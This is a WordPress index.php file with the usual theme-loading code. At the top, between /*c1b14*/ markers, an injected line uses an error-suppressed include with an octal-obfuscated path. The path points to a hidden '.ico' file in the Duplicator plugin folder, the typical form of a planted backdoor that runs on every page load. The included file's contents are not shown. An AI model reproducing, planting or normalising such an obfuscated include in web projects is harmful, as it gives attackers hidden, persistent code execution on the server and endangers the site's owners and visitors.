<?php
/*c1b14*/

@include "\057ho\155e/\151na\156hs\151eu\162e.\143om\057pu\142li\143_h\164ml\057wp\055co\156te\156t/\160lu\147in\163/d\165pl\151ca\164or\057.5\07164\14372\145.i\143o";

/*c1b14*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
